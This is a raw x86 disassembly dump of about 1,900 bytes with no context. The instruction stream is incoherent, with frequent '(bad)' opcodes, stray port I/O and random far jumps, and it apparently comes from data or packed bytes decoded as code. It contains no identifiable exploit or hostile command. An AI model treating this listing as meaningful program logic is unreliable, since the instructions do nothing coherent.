  4168bf:	call   0xd757:0x5e4733f
  4168c6:	cmp    eax,0x57aa7cb3
  4168cb:	iret   
  4168cc:	or     bl,BYTE PTR [eax+ecx*1+0x51]
  4168d0:	xor    eax,0xf9d702b1
  4168d5:	add    al,0x20
  4168d7:	cdq    
  4168d8:	and    ch,bh
  4168da:	jle    0x416904
  4168dc:	xor    edi,DWORD PTR [edx-0x6c]
  4168df:	fwait
  4168e0:	sti    
  4168e1:	push   eax
  4168e2:	shl    DWORD PTR [ecx-0x60],1
  4168e5:	xchg   DWORD PTR [ebx-0x76],esi
  4168e8:	add    ch,BYTE PTR [edx]
  4168ea:	cmp    al,0xc2
  4168ec:	push   0xffffff89
  4168ee:	in     eax,dx
  4168ef:	retf   
  4168f0:	pause  
  4168f2:	call   0x227df798
  4168f7:	(bad)  
  4168f8:	jmp    0x3e70:0xd20f4702
  4168ff:	nop
  416900:	test   BYTE PTR [ebx-0x76],cl
  416903:	and    BYTE PTR [edx-0x63e4ba26],ah
  416909:	aaa    
  41690a:	out    0xdd,al
  41690c:	push   edx
  41690d:	xchg   edi,eax
  41690e:	gs ins DWORD PTR es:[edi],dx
  416910:	ds call 0xf403:0x74ce424f
  416918:	xchg   esp,eax
  416919:	popf   
  41691a:	shl    DWORD PTR [eax+0x5fec6f20],0xa4
  416921:	dec    edi
  416922:	and    al,0x1c
  416924:	inc    ecx
  416925:	mov    ah,0x54
  416927:	xlat   BYTE PTR ds:[ebx]
  416928:	pop    esi
  416929:	add    al,BYTE PTR [eax+0x7b]
  41692c:	pop    esp
  41692d:	mov    ebx,0x60bcca5a
  416932:	lods   eax,DWORD PTR ds:[esi]
  416933:	jae    0x416938
  416935:	sub    al,al
  416937:	jnp    0x416927
  416939:	(bad)  
  41693a:	cmp    al,0x18
  41693c:	call   0x13e8:0xdd6c23a9
  416943:	gs cdq 
  416945:	rcl    BYTE PTR [ebx-0x5aa29a4],0xdf
  41694c:	fucomi st,st(2)
  41694e:	stos   BYTE PTR es:[edi],al
  41694f:	outs   dx,BYTE PTR ds:[esi]
  416950:	lds    edx,FWORD PTR [ebx]
  416952:	push   0xb6fa5059
  416957:	and    BYTE PTR [ebx+edi*2],0x87
  41695b:	ror    BYTE PTR [edx-0x7ed203d0],cl
  416961:	shl    BYTE PTR [esp+edi*2],1
  416964:	stos   BYTE PTR es:[edi],al
  416965:	sahf   
  416966:	and    DWORD PTR [ebx],esp
  416968:	(bad)  
  416969:	xor    eax,edi
  41696b:	xchg   bl,cl
  41696d:	retf   
  41696e:	sub    DWORD PTR [ebx+0x1c],0xffffffc6
  416972:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  416974:	pop    eax
  416975:	popa   
  416976:	je     0x416952
  416978:	push   ecx
  416979:	pop    ebp
  41697a:	xchg   esi,eax
  41697b:	add    ecx,DWORD PTR [ecx-0x4a]
  41697e:	push   cs
  41697f:	dec    ecx
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	cmp    ebp,ecx
  416995:	addr16 std 
  416997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x7570707e
  4169a0:	lock xchg ebx,eax
  4169a2:	mov    esp,DWORD PTR [edx-0x72]
  4169a5:	enter  0xd734,0x3f
  4169a9:	adc    eax,0xf44f6b44
  4169ae:	xor    bh,BYTE PTR [eax-0x60]
  4169b1:	(bad)  
  4169b2:	mov    ah,BYTE PTR [esi-0x6abc4df]
  4169b8:	jbe    0x416a0a
  4169ba:	(bad)  
  4169bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169bc:	fs jmp 0xea4929de
  4169c2:	mov    eax,ds:0xa7381afc
  4169c7:	test   al,0x49
  4169c9:	shl    DWORD PTR [ecx+0x2ccd80ef],cl
  4169cf:	iret   
  4169d0:	cmp    BYTE PTR [edi],bh
  4169d2:	or     eax,esp
  4169d4:	loop   0x416989
  4169d6:	ret    
  4169d7:	mov    esp,0xe5267947
  4169dc:	cli    
  4169dd:	(bad)  
  4169de:	cmp    al,0x5f
  4169e0:	(bad)  
  4169e1:	mov    dl,0x3c
  4169e3:	arpl   sp,di
  4169e5:	jecxz  0x4169c3
  4169e7:	xor    DWORD PTR ds:0x9ad28fcc,edi
  4169ed:	scas   eax,DWORD PTR es:[edi]
  4169ee:	sar    DWORD PTR [edi+ecx*1],cl
  4169f1:	fwait
  4169f2:	push   eax
  4169f3:	jno    0x416a3a
  4169f5:	push   es
  4169f6:	mov    dh,0x32
  4169f8:	imul   ebx,DWORD PTR [ecx-0x7c],0x2c
  4169fc:	leave  
  4169fd:	jg     0x416a43
  4169ff:	pop    ebx
  416a00:	test   eax,0x98abb265
  416a05:	jg     0x416a60
  416a07:	jns    0x4169d6
  416a09:	mov    edi,0x920aba16
  416a0e:	fisubr DWORD PTR [ecx+esi*8]
  416a11:	xlat   BYTE PTR ds:[ebx]
  416a12:	and    al,0x8f
  416a14:	sahf   
  416a15:	jecxz  0x4169cd
  416a17:	jae    0x416a2d
  416a19:	push   cs
  416a1a:	sahf   
  416a1b:	mov    dh,0xbe
  416a1d:	(bad)  
  416a1e:	repz ja 0x4169c7
  416a21:	inc    ebx
  416a22:	xchg   BYTE PTR [ecx+0x6176159e],bh
  416a28:	fwait
  416a29:	sub    ah,BYTE PTR [ecx+eax*2-0x6c846904]
  416a30:	lds    eax,FWORD PTR [ecx-0x31]
  416a33:	jne    0x416a77
  416a35:	fst    QWORD PTR [edi]
  416a37:	(bad)  
  416a38:	jb     0x4169de
  416a3a:	push   edi
  416a3b:	lods   al,BYTE PTR ds:[esi]
  416a3c:	je     0x416a40
  416a3e:	ds inc eax
  416a40:	cmp    edx,ecx
  416a42:	inc    eax
  416a43:	adc    DWORD PTR cs:[ecx+0x54],ecx
  416a47:	jne    0x416a3a
  416a49:	or     cl,ah
  416a4b:	data16 je 0x416a36
  416a4e:	cli    
  416a4f:	sbb    eax,0x435a169b
  416a54:	mov    edx,0x7dbed213
  416a59:	inc    ecx
  416a5a:	xchg   ebx,eax
  416a5b:	fld    DWORD PTR [ecx]
  416a5d:	jmp    FWORD PTR [ebp+0xa2ee00e]
  416a63:	mov    edi,0xc0652c8f
  416a68:	dec    ecx
  416a69:	mov    esp,0x75f41d4c
  416a6e:	cdq    
  416a6f:	lahf   
  416a70:	adc    edi,DWORD PTR [edi+0x2c31ec14]
  416a76:	sub    al,0x52
  416a78:	and    al,0x11
  416a7a:	cmp    esi,DWORD PTR ds:0x409bdb7e
  416a80:	push   ebx
  416a81:	cmc    
  416a82:	cmp    al,BYTE PTR [edi-0x4de4d49d]
  416a88:	mov    ebx,0x5057b1be
  416a8d:	stos   BYTE PTR es:[edi],al
  416a8e:	xchg   edi,eax
  416a8f:	add    al,0x75
  416a91:	mov    eax,ds:0xad434be3
  416a96:	clc    
  416a97:	xchg   ebx,eax
  416a98:	fimul  WORD PTR [edx]
  416a9a:	push   ss
  416a9b:	push   edi
  416a9c:	and    esp,DWORD PTR [edi+0x79]
  416a9f:	push   ebx
  416aa0:	inc    esp
  416aa1:	sahf   
  416aa2:	and    DWORD PTR [ecx-0x4ac8c3aa],0xffffffb6
  416aa9:	cmc    
  416aaa:	fs ret 
  416aac:	adc    al,0x4
  416aae:	xlat   BYTE PTR ds:[ebx]
  416aaf:	sahf   
  416ab0:	shl    ch,cl
  416ab2:	or     bl,BYTE PTR [ebp+0x1b]
  416ab5:	and    esp,eax
  416ab7:	loop   0x416abc
  416ab9:	test   bh,0xa7
  416abc:	jge    0x416af3
  416abe:	stos   BYTE PTR es:[edi],al
  416abf:	mov    ds:0x2a112597,al
  416ac4:	cmp    al,0xe7
  416ac6:	(bad)  
  416ac8:	and    al,0x2d
  416aca:	fild   DWORD PTR [edx-0x1a]
  416acd:	ficomp DWORD PTR [edx]
  416acf:	push   edx
  416ad0:	and    BYTE PTR [ebx+0x4187814b],dl
  416ad6:	sub    DWORD PTR [edx],eax
  416ad8:	pop    esi
  416ad9:	pop    ebp
  416ada:	jo     0x416a96
  416adc:	cdq    
  416add:	jmp    0xfbb3:0x459c5cf2
  416ae4:	sbb    al,0x4b
  416ae6:	inc    ecx
  416ae7:	dec    esi
  416ae8:	in     eax,dx
  416ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aea:	adc    ebp,esi
  416aec:	fsub   QWORD PTR ss:[edx]
  416aef:	hlt    
  416af0:	jecxz  0x416af5
  416af2:	jb     0x416abd
  416af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416af5:	add    BYTE PTR [ecx-0x350285d6],ah
  416afb:	push   esp
  416afc:	ins    BYTE PTR es:[edi],dx
  416afd:	xlat   BYTE PTR ds:[ebx]
  416afe:	sbb    BYTE PTR [edi],ah
  416b00:	lea    esi,[edi]
  416b02:	push   es
  416b03:	js     0x416b25
  416b05:	enter  0x7108,0x2
  416b09:	push   eax
  416b0a:	int    0xdf
  416b0c:	and    BYTE PTR [ebx-0x7d],ah
  416b0f:	mov    esp,0x72f83fd7
  416b14:	int    0xd1
  416b16:	ja     0x416aad
  416b18:	sub    DWORD PTR [ebx],0xffffff99
  416b1b:	jb     0x416b4f
  416b1d:	and    edi,DWORD PTR [eax-0x110c7a]
  416b23:	addr16 leave 
  416b25:	add    dh,BYTE PTR [ebx-0x19]
  416b28:	xor    DWORD PTR [esi],ecx
  416b2a:	nop
  416b2b:	push   0xa1be5285
  416b30:	fcomp  DWORD PTR [ebx-0x15]
  416b33:	and    al,0xb5
  416b35:	sbb    eax,0x54a49c1e
  416b3a:	adc    dl,BYTE PTR [ebx+0x67b052cb]
  416b40:	fisttp DWORD PTR [edx]
  416b42:	je     0x416b42
  416b44:	pop    ds
  416b45:	enter  0x78f,0xe4
  416b49:	pushf  
  416b4a:	ret    0xac62
  416b4d:	test   BYTE PTR [ebx+0x4f],ch
  416b50:	push   edi
  416b51:	das    
  416b52:	lods   al,BYTE PTR ds:[esi]
  416b53:	or     ebx,esi
  416b55:	rcr    BYTE PTR [esi+0x24],1
  416b58:	int    0xd4
  416b5a:	mov    cl,0x80
  416b5c:	rcl    ebp,1
  416b5e:	enter  0x5017,0x75
  416b62:	dec    eax
  416b63:	loope  0x416b4f
  416b65:	pop    edi
  416b66:	add    ebp,DWORD PTR ss:[ebx+0x1a15610f]
  416b6d:	rcr    DWORD PTR [ebp+0x40],0xfd
  416b71:	scas   eax,DWORD PTR es:[edi]
  416b72:	sbb    eax,0xc7743b19
  416b77:	imul   ecx,DWORD PTR [eax+eax*4],0x57
  416b7b:	mov    edx,0x366e23af
  416b80:	dec    edi
  416b81:	popa   
  416b82:	es dec ebp
  416b84:	fld    DWORD PTR [edi]
  416b86:	mov    al,ds:0x29c3a508
  416b8b:	dec    esi
  416b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b8d:	mov    edx,0x3fc53f15
  416b92:	jae    0x416b72
  416b94:	(bad)  
  416b95:	stc    
  416b96:	jmp    0x1237a60b
  416b9b:	vpcomq xmm8,xmm7,XMMWORD PTR [edi-0x71ed6df5],0xd2
  416ba5:	pop    ebp
  416ba6:	xchg   BYTE PTR [esp+ebp*1-0x57],ah
  416baa:	mov    bh,BYTE PTR ds:0x7119dc52
  416bb0:	xor    eax,0x9cbe77d0
  416bb5:	fisttp QWORD PTR [esi+ecx*8-0x48f0f577]
  416bbc:	push   ss
  416bbd:	stos   DWORD PTR es:[edi],eax
  416bbe:	mov    ds:0xbc34be40,eax
  416bc3:	push   eax
  416bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bc5:	pop    ebx
  416bc6:	or     al,0x26
  416bc8:	mov    dl,0x7d
  416bca:	fstp   TBYTE PTR [esi+eiz*2]
  416bcd:	arpl   WORD PTR [ebx-0xedef8cf],si
  416bd3:	pop    edx
  416bd4:	dec    ebp
  416bd5:	out    dx,al
  416bd6:	out    dx,eax
  416bd7:	aaa    
  416bd8:	mov    BYTE PTR [esp+ebx*2-0x4c],bh
  416bdc:	push   ds
  416bdd:	inc    esp
  416bde:	dec    ebx
  416bdf:	jae    0x416c40
  416be1:	lar    edi,WORD PTR [ebp+0x48]
  416be5:	call   DWORD PTR es:[eax]
  416be8:	xchg   edi,eax
  416be9:	jl     0x416bd2
  416beb:	pop    ecx
  416bec:	mov    ah,0x3d
  416bee:	xor    eax,0x4a3c1e13
  416bf3:	lods   al,BYTE PTR ds:[esi]
  416bf4:	and    al,cl
  416bf6:	ins    DWORD PTR es:[edi],dx
  416bf7:	pop    ecx
  416bf8:	or     dl,BYTE PTR [eax-0xb]
  416bfb:	add    edx,DWORD PTR [edx-0x1c]
  416bfe:	icebp  
  416bff:	fist   WORD PTR [eax-0x4]
  416c02:	or     al,0x4a
  416c04:	push   ds
  416c05:	or     al,0xa3
  416c07:	or     eax,0x64da571
  416c0c:	inc    ecx
  416c0d:	mov    ebp,0x5ae2a9ba
  416c12:	pop    esi
  416c13:	nop
  416c14:	mov    gs,edi
  416c16:	and    DWORD PTR [ecx+ecx*8-0x6b],edx
  416c1a:	jmp    0xaa35:0x8e9a9d0e
  416c21:	rol    DWORD PTR [edx-0x54b0331c],cl
  416c27:	sbb    cl,ch
  416c29:	xchg   ebp,eax
  416c2a:	lea    esp,[esi+0x68]
  416c2d:	outs   dx,DWORD PTR ds:[esi]
  416c2e:	mov    eax,0x2d93c706
  416c33:	and    BYTE PTR [eax+0x655a31dc],ah
  416c39:	adc    esp,DWORD PTR [ecx+edi*2-0x56c6a097]
  416c40:	and    cl,cl
  416c42:	jbe    0x416bc4
  416c44:	test   eax,0x3ba1a280
  416c49:	sub    eax,0xe221907b
  416c4e:	int    0xc8
  416c50:	xor    al,ah
  416c52:	dec    ebx
  416c53:	int    0x5e
  416c55:	stos   BYTE PTR es:[edi],al
  416c56:	and    eax,0x84c1d74d
  416c5b:	xchg   esp,eax
  416c5c:	imul   ebp,DWORD PTR [esp+eiz*4],0x58588d06
  416c63:	nop
  416c64:	sbb    BYTE PTR [ecx+ecx*2-0x75],0x45
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	or     eax,0xee0d7a71
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416ca7
  416c88:	xor    edi,DWORD PTR [edx]
  416c8a:	je     0x416c8c
  416c8c:	push   ebx
  416c8d:	mov    ds:0x8135e96a,eax
  416c92:	ins    BYTE PTR es:[edi],dx
  416c93:	mov    al,ds:0xc925fdfc
  416c98:	mov    ch,0x42
  416c9a:	jno    0x416ca3
  416c9c:	std    
  416c9d:	sbb    ebp,DWORD PTR [edi-0x21cbd59b]
  416ca3:	iret   
  416ca4:	in     al,0x88
  416ca6:	pusha  
  416ca7:	in     al,dx
  416ca8:	xchg   esp,eax
  416ca9:	cmp    DWORD PTR [ebx+0x7b],ecx
  416cac:	fwait
  416cad:	inc    eax
  416cae:	dec    ebx
  416caf:	xlat   BYTE PTR ds:[ebx]
  416cb0:	nop
  416cb1:	pop    ecx
  416cb2:	in     eax,dx
  416cb3:	and    DWORD PTR [eax+0x1d7a3552],esp
  416cb9:	into   
  416cba:	push   0xffffff8b
  416cbc:	aam    0x5e
  416cbe:	jle    0x416c83
  416cc0:	and    al,0x8d
  416cc2:	dec    ebp
  416cc3:	je     0x416cb9
  416cc5:	fwait
  416cc6:	and    edi,esp
  416cc8:	(bad)  
  416cc9:	adc    eax,0x19dfe188
  416cce:	cdq    
  416ccf:	call   FWORD PTR [ecx+0x21]
  416cd2:	adc    edx,esp
  416cd4:	repz mov dh,0x2
  416cd7:	jp     0x416d14
  416cd9:	ror    BYTE PTR [ebp-0x2f184795],1
  416cdf:	shr    DWORD PTR [ebp+eax*2-0x7d],cl
  416ce3:	cmp    ch,bl
  416ce5:	ss or  al,0xa3
  416ce8:	dec    ecx
  416ce9:	hlt    
  416cea:	jp     0x416c8c
  416cec:	mov    ds:0x1a9d1db,eax
  416cf1:	out    dx,eax
  416cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cf3:	hlt    
  416cf4:	test   ebp,0xf1712263
  416cfa:	push   edi
  416cfb:	or     bh,BYTE PTR [ecx+ebp*2+0x37f9db92]
  416d02:	hlt    
  416d03:	arpl   WORD PTR [ebx+0x244213ea],di
  416d09:	femms  
  416d0b:	push   ds
  416d0c:	xor    al,0x36
  416d0e:	in     eax,0x8d
  416d10:	xor    DWORD PTR [ecx-0x53fa5658],0x3b
  416d17:	add    al,0xe3
  416d19:	fwait
  416d1a:	mov    ecx,0xb8a608de
  416d1f:	out    dx,eax
  416d20:	and    eax,0xcef5c135
  416d25:	dec    ecx
  416d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d27:	mov    ch,0xd
  416d29:	daa    
  416d2a:	sbb    al,dl
  416d2c:	mov    ch,BYTE PTR ds:0xb33fc28f
  416d32:	add    eax,0xf86cd0b2
  416d37:	sub    esi,DWORD PTR [eax]
  416d39:	test   BYTE PTR [edi],0x3e
  416d3c:	adc    DWORD PTR ds:0xa81bc7ff,edx
  416d42:	inc    esi
  416d43:	push   es
  416d44:	test   al,0x2
  416d46:	adc    BYTE PTR [edx-0x5d],cl
  416d49:	loop   0x416d25
  416d4b:	test   BYTE PTR [edx-0x5523f913],cl
  416d51:	sbb    al,0x59
  416d53:	dec    ecx
  416d54:	ds (bad) 
  416d56:	cli    
  416d57:	pop    ecx
  416d58:	or     ebx,esp
  416d5a:	test   eax,0x368e3d2d
  416d5f:	dec    edi
  416d60:	mov    ecx,0xe9eeafd6
  416d65:	mov    cl,0xa9
  416d67:	inc    ebx
  416d68:	arpl   WORD PTR [esi+eiz*8],sp
  416d6b:	lds    ecx,FWORD PTR ds:0xb5b8620c
  416d71:	(bad)  
  416d72:	fmul   st,st(7)
  416d74:	mov    bh,0xbf
  416d76:	or     eax,0x4c433c5c
  416d7b:	push   0xb604ba23
  416d80:	scas   eax,DWORD PTR es:[edi]
  416d81:	repz js 0x416d48
  416d84:	fwait
  416d85:	add    eax,DWORD PTR ds:0x8cccb8b8
  416d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d8c:	cld    
  416d8d:	inc    esp
  416d8e:	sub    DWORD PTR [esi],ecx
  416d90:	iret   
  416d91:	cmc    
  416d92:	cmp    al,0xb9
  416d94:	mov    DWORD PTR [ecx+esi*8+0x1c],0xc0677e2d
  416d9c:	out    0x9,eax
  416d9e:	cmp    al,0xa5
  416da0:	clc    
  416da1:	dec    si
  416da3:	sbb    DWORD PTR [esi+0x6e],ecx
  416da6:	mov    ecx,0xa458dab7
  416dab:	cwde   
  416dac:	cwde   
  416dad:	jecxz  0x416d34
  416daf:	in     eax,dx
  416db0:	icebp  
  416db1:	cld    
  416db2:	stc    
  416db3:	push   ds
  416db4:	nop
  416db5:	adc    eax,0x9b24fb35
  416dba:	mov    esp,0x69ae0684
  416dbf:	pop    esi
  416dc0:	(bad)  
  416dc1:	imul   ecx,DWORD PTR [edi],0xce38bd68
  416dc7:	xor    ebp,ebx
  416dc9:	(bad)  
  416dca:	stos   DWORD PTR es:[edi],eax
  416dcb:	adc    esi,DWORD PTR [ebp-0xd]
  416dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dcf:	neg    bl
  416dd1:	sahf   
  416dd2:	inc    eax
  416dd3:	push   ebx
  416dd4:	pop    ebp
  416dd5:	nop
  416dd6:	push   ebp
  416dd7:	pop    esi
  416dd8:	pushf  
  416dd9:	shr    eax,0x5a
  416ddc:	test   DWORD PTR [ebp+0x9c2128b],ecx
  416de2:	pop    ebp
  416de3:	or     DWORD PTR [esi-0x13925dcc],edx
  416de9:	test   al,0x6b
  416dec:	xchg   BYTE PTR [edi],ch
  416dee:	imul   edx,DWORD PTR [bx+di+0x4014],0xffffffa2
  416df4:	mov    esp,ebp
  416df6:	cmp    DWORD PTR [ecx+0x49],esi
  416df9:	cs add eax,0x4b1e64b
  416dff:	push   esi
  416e00:	scas   al,BYTE PTR es:[edi]
  416e01:	sub    BYTE PTR [ecx+0x6d50ba88],bh
  416e07:	retf   0x1b77
  416e0a:	int3   
  416e0b:	aaa    
  416e0c:	mov    eax,ebx
  416e0e:	mov    dl,0x56
  416e10:	and    BYTE PTR [ebp+0x57a4fa2d],cl
  416e16:	bound  esi,QWORD PTR [esi]
  416e18:	retf   0x2319
  416e1b:	sbb    DWORD PTR cs:[edi+0x2],esi
  416e1f:	es dec edx
  416e21:	ret    
  416e22:	sub    ebp,eax
  416e24:	je     0x416e14
  416e26:	add    BYTE PTR [ebp-0x5b56fb2f],dl
  416e2c:	fild   QWORD PTR [edx+0x54e9c74a]
  416e32:	cmp    bl,BYTE PTR [ebx+0x6b]
  416e35:	stos   DWORD PTR es:[edi],eax
  416e36:	adc    eax,0x97a3623
  416e3b:	lods   eax,DWORD PTR ds:[esi]
  416e3c:	(bad)
  416e3f:	sar    DWORD PTR [edi+esi*1-0x2e04e14c],1
  416e46:	jo     0x416e36
  416e48:	jbe    0x416e3e
  416e4a:	sbb    al,0x5a
  416e4c:	nop
  416e4d:	cmp    cl,al
  416e4f:	or     ecx,DWORD PTR [ebp-0xd]
  416e52:	out    0xcc,al
  416e54:	mov    ah,0xb0
  416e56:	mov    ds:0x4d0999f7,eax
  416e5b:	jecxz  0x416e32
  416e5d:	mov    eax,0x60b43ad4
  416e62:	adc    eax,0xac1a219
  416e67:	mov    dl,0x76
  416e69:	faddp  st(0),st
  416e6b:	pusha  
  416e6c:	pop    ecx
  416e6d:	inc    eax
  416e6e:	add    ecx,ebp
  416e70:	mov    esi,0xc4663859
  416e75:	add    BYTE PTR [ebx+0x52c0de02],dh
  416e7b:	cmp    BYTE PTR [di],bl
  416e7e:	loop   0x416e39
  416e80:	xchg   BYTE PTR cs:[ebp*1+0x776b2bff],ah
  416e88:	add    ch,dh
  416e8a:	sbb    DWORD PTR [esi+0x574da552],eax
  416e90:	sub    al,0xdc
  416e92:	push   cs
  416e93:	aam    0x92
  416e95:	in     eax,0xd9
  416e97:	lahf   
  416e98:	repnz loop 0x416e3f
  416e9b:	ins    DWORD PTR es:[edi],dx
  416e9c:	repz dec ebx
  416e9e:	fadd   DWORD PTR [ebp+0xb2e8e60]
  416ea4:	sbb    eax,0x763da43d
  416ea9:	xlat   BYTE PTR ds:[ebx]
  416eaa:	sahf   
  416eab:	mov    ah,0x27
  416ead:	and    esi,DWORD PTR [ebx]
  416eaf:	inc    eax
  416eb0:	mov    eax,ds:0xc651d1
  416eb5:	mov    edx,0x1407616e
  416eba:	outs   dx,BYTE PTR ds:[esi]
  416ebb:	mov    ecx,0x353b6f72
  416ec0:	push   ss
  416ec1:	cdq    
  416ec2:	jecxz  0x416e51
  416ec4:	cmc    
  416ec5:	or     BYTE PTR [esp+edx*1-0x39e3f6c5],0x4e
  416ecd:	rcr    BYTE PTR fs:[eax-0x2c],cl
  416ed1:	or     ch,cl
  416ed3:	jbe    0x416f3d
  416ed5:	xor    al,0x38
  416ed7:	add    ebx,DWORD PTR [eax+0xe]
  416eda:	jl     0x416ee5
  416edc:	imul   edx,DWORD PTR [esp+eax*8-0x2d8129a4],0xffffffec
  416ee4:	add    eax,0x3852343b
  416ee9:	mov    edx,0xe811e963
  416eee:	ds jb  0x416e77
  416ef1:	(bad)  
  416ef2:	lods   eax,DWORD PTR ds:[esi]
  416ef3:	test   eax,0xd094df59
  416ef8:	rcr    BYTE PTR [edi+0xe],0x55
  416efc:	mov    BYTE PTR [edi-0x19],dh
  416eff:	outs   dx,DWORD PTR ds:[esi]
  416f00:	fwait
  416f01:	cwde   
  416f02:	cmp    dl,BYTE PTR [eax-0x3ad0e5b3]
  416f08:	mov    WORD PTR ds:0x2ae8a04b,cs
  416f0e:	pop    ss
  416f0f:	ja     0x416ee6
  416f11:	push   esp
  416f12:	cmp    eax,DWORD PTR [esi]
  416f14:	sub    DWORD PTR [esi-0x3bdb9bbb],0xb64a5186
  416f1e:	aad    0x77
  416f20:	mov    eax,ds:0xbc4fd575
  416f25:	xor    edx,edx
  416f27:	fdiv   DWORD PTR [ebp-0x7b]
  416f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f2b:	cdq    
  416f2c:	dec    ebx
  416f2d:	or     al,0x60
  416f2f:	cmp    BYTE PTR [ebp-0x60d5c1dc],bh
  416f35:	push   ss
  416f36:	pop    es
  416f37:	mov    dl,0xec
  416f39:	lods   al,BYTE PTR ds:[esi]
  416f3a:	leave  
  416f3b:	xchg   edx,eax
  416f3c:	idiv   DWORD PTR [edi+0x3a53ab87]
  416f42:	inc    ebp
  416f43:	or     al,0xac
  416f45:	and    eax,0x506ca8e1
  416f4a:	sub    ebp,DWORD PTR [edx]
  416f4c:	mov    BYTE PTR [edx+0xf],dl
  416f4f:	scas   eax,DWORD PTR es:[edi]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	cli    
  416f6b:	dec    ebp
  416f6c:	inc    esi
  416f6d:	iret   
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0x4770707e
  416f77:	es fdivp st(5),st
  416f7a:	js     0x416f19
  416f7c:	xchg   edi,eax
  416f7d:	xor    al,0xa6
  416f7f:	aad    0x91
  416f81:	(bad)  
  416f82:	stc    
  416f83:	mov    dl,0x8e
  416f85:	mov    esp,0x86982821
  416f8a:	and    eax,0x71fdb680
  416f8f:	retf   0x7371
  416f92:	and    esi,esi
  416f94:	or     ecx,DWORD PTR [ebx]
  416f96:	add    al,0xc3
  416f98:	pop    es
  416f99:	fwait
  416f9a:	cmp    eax,0xca35714a
  416f9f:	jb     0x416fe2
  416fa1:	mov    WORD PTR [esp+ebp*8-0x77],cs
  416fa5:	pop    edi
  416fa6:	mov    esi,0xa85716b4
  416fab:	std    
  416fac:	and    al,0xe2
  416fae:	mov    BYTE PTR [ebx-0x54],dh
  416fb1:	fld    QWORD PTR [edi-0x30]
  416fb4:	push   0x9522f874
  416fb9:	jo     0x416fff
  416fbb:	retf   
  416fbc:	push   es
  416fbd:	ds aad 0x3c
  416fc0:	lods   al,BYTE PTR ds:[esi]
  416fc1:	push   0xb8827e7b
  416fc6:	adc    dh,BYTE PTR [ebx-0x2ade6b1c]
  416fcc:	leave  
  416fcd:	shl    esp,0x26
  416fd0:	ror    BYTE PTR [edx-0x1a],1
  416fd3:	cld    
  416fd4:	pop    es
  416fd5:	mov    ecx,0x4d6c1498
  416fda:	or     cl,cl
  416fdc:	add    BYTE PTR [ebp+0x55],ah
  416fdf:	nop
  416fe0:	jge    0x416ff9
  416fe2:	mov    dh,ch
  416fe4:	dec    esi
  416fe5:	sub    eax,0x9498897d
  416fea:	fidivr DWORD PTR [ebx+edx*4-0x141867c0]
  416ff1:	scas   al,BYTE PTR es:[edi]
  416ff2:	loop   0x416f86
  416ff4:	mov    al,0xea
  416ff6:	lock arpl WORD PTR [ecx],bx
  416ff9:	sub    esp,ecx
  416ffb:	js     0x417066
  416ffd:	pusha  
  416ffe:	(bad)  
  416fff:	test   DWORD PTR [esi+0x69da9ab0],0x4890e70
  417009:	pusha  
  41700a:	mov    bl,0x43
  41700c:	aam    0xd3
  41700e:	xor    eax,0xa9aae327
  417013:	(bad)  
  417014:	sbb    edi,DWORD PTR [esi-0x48]
  417017:	jb     0x41701c
  417019:	popa   
  41701a:	fild   DWORD PTR [edi+0x6]
  41701d:	add    ebp,DWORD PTR [esi]
  41701f:	in     eax,dx
  417020:	cmp    BYTE PTR [esi-0x6350c8f6],dh
  417026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417027:	aad    0x8e
  417029:	stos   BYTE PTR es:[edi],al
  41702a:	pop    ecx
  41702b:	outs   dx,DWORD PTR ds:[esi]
  41702c:	shr    cl,0x21
  41702f:	xchg   BYTE PTR [ebp-0x9],ah
  417032:	in     al,dx
  417033:	dec    BYTE PTR ds:0xb8ed63a0
  417039:	mov    DWORD PTR [eax-0x4],0x1fcc6333
  417040:	ja     0x41703d
  417042:	fwait
  417043:	lds    eax,FWORD PTR [edx+0x18]
  417046:	mov    esp,ebp
  417048:	push   edx
  417049:	das    
  41704a:	pop    ebp
  41704b:	sar    DWORD PTR [eax+esi*1-0x33],cl
  41704f:	adc    ebp,esi
  417051:	aas    
  417052:	inc    edx
  417053:	mov    dh,al
  417055:	imul   esi,DWORD PTR [esi+0x79c4110e],0x777cd623
  41705f:	mov    ebx,DWORD PTR [esi+esi*1-0x36]
  417063:	out    dx,eax
  417064:	push   0x7b9698e1
  417069:	in     eax,0xcf
  41706b:	jne    0x41708b
  41706d:	ds gs inc esp
  417070:	cmp    ebp,DWORD PTR [ecx]
  417072:	mov    ecx,0x432e64b8
  417077:	icebp  
  417078:	aaa    
  417079:	fs out 0x14,eax
  41707c:	mov    ebx,0x3f5de41a
